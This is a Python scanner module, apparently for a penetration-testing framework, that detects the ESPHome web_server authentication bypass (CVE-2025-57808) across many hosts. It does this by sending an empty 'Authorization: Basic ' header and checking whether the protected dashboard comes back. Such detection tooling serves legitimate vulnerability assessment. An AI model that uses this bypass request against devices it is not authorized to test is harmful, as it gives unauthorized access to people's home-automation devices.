import ssl
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

DASHBOARD_MARKER = "Dashboard - ESPHome"


@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""


class ESPHomeAuthBypassDetect(Auxiliary):
    NAME = "ESPHome web_server Authentication Bypass Detection (CVE-2025-57808)"
    DESCRIPTION = (
        "Detects ESPHome 2025.8.0 devices vulnerable to the web_server "
        "basic auth bypass on the ESP-IDF platform. The authentication "
        "check compares only a prefix of the base64-encoded Authorization "
        "value, so an empty or truncated value passes. This scanner first "
        "confirms the endpoint returns 401 (auth enabled), then sends an "
        "empty 'Authorization: Basic ' header and checks for the ESPHome "
        "dashboard marker. Detection only - no OTA or config access."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "excellent"
    SEVERITY = "high"
    DISCLOSED = "2025-08-31"
    CHECK = True
    REFERENCES = [
        "CVE-2025-57808",
        "GHSA-mxh2-ccgj-8635",
        "https://github.com/advisories/GHSA-mxh2-ccgj-8635",
        "https://esphome.io/components/web_server/",
    ]

    OPTIONS = [
        Option("RHOSTS", required=True,
               description="target(s): host | h1,h2 | CIDR | range | file:path"),
        Option("RPORT", default=80, type=int, description="HTTP port"),
        Option("SSL", default=False, type=bool, description="use HTTPS"),
        Option("TIMEOUT", default=10.0, type=float, description="per-request timeout"),
        Option("THREADS", default=20, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool,
               description="stop after first vulnerable host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts:
            raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _base_url(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _get(self, host, path, extra_headers=None):
        url = self._base_url(host) + path
        ctx = ssl._create_unverified_context()
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        for k, v in (extra_headers or {}).items():
            req.add_header(k, v)
        try:
            with urllib.request.urlopen(
                req, timeout=self.options["TIMEOUT"], context=ctx
            ) as r:
                return r.status, r.read(200_000).decode(errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read(200_000).decode(errors="replace")
        except urllib.error.URLError:
            raise

    def _probe(self, host):
        result = HostResult(host=host)

        try:
            st, _body = self._get(host, "/")
        except urllib.error.URLError as e:
            result.detail = type(e).__name__
            return result

        if st != 401:
            result.state = "safe"
            result.detail = "endpoint did not return 401 (auth may be off, or not ESPHome)"
            return result

        try:
            st2, body = self._get(
                host, "/",
                extra_headers={"Authorization": "Basic "},
            )
        except urllib.error.URLError as e:
            result.detail = "bypass request failed (" + type(e).__name__ + ")"
            return result

        if st2 == 200 and DASHBOARD_MARKER in body:
            result.state = "vulnerable"
            result.detail = "auth bypassed (empty Basic header returned dashboard)"
            return result

        if st2 == 401:
            result.state = "safe"
            result.detail = "empty Basic header rejected (patched)"
            return result

        result.state = "safe"
        result.detail = "bypass attempt returned HTTP " + str(st2)
        return result

    def _record_host_result(self, h):
        svc_name = "https" if self.options["SSL"] else "http"
        self.report_host(h.host, state="up")
        self.report_service(
            h.host, self.options["RPORT"],
            proto="tcp", state="open",
            name=svc_name, banner="ESPHome",
        )
        self.report_vuln(
            name=self.NAME,
            address=h.host,
            severity="high",
            refs="CVE-2025-57808",
            info=h.detail,
        )

    def check(self):
        targets = self._expand_targets()
        if len(targets) > 1:
            print(colors.warn(
                "check on multiple targets: probing only " + targets[0] +
                " (use 'run' to scan all " + str(len(targets)) + ")"
            ))
        host = targets[0]
        print(colors.info("check: probing " + self._base_url(host)))

        r = self._probe(host)

        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " vulnerable (" + r.detail + ")"))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"])
        stop_first = self.options["STOP_ON_FIRST"]

        print(colors.info(
            "scanning " + str(len(targets)) + " host(s) with "
            + str(threads) + " threads"
        ))

        bar = ProgressBar(total=len(targets), prefix="scan")
        hits = []
        clean = 0
        unknown = 0
        aborted = False

        db = self._db()
        workspace_active = bool(db and db.current_workspace_id())

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try:
                        r = fut.result()
                    except Exception:
                        unknown += 1
                        continue

                    if r.state == "vulnerable":
                        hits.append(r)
                        bar.log(colors.vuln(r.host + " - " + r.detail))
                        if workspace_active:
                            self._record_host_result(r)
                        if stop_first:
                            aborted = True
                            for f in futures:
                                f.cancel()
                            break
                    elif r.state == "safe":
                        clean += 1
                    else:
                        unknown += 1
        finally:
            bar.done()

        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.warn(str(unknown)))
        if aborted:
            print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        if workspace_active and hits:
            ws = db.current_workspace()
            print("  recorded:     " + colors.dimmed(
                f"{len(hits)} host(s), {len(hits)} service(s), "
                f"{len(hits)} vuln(s) in workspace '{ws}'"
            ))
        if hits:
            print(colors.heading("  vulnerable hosts:"))
            for h in hits:
                print("    " + colors.vuln(h.host) + "  " + colors.dimmed(h.detail))

        return hits
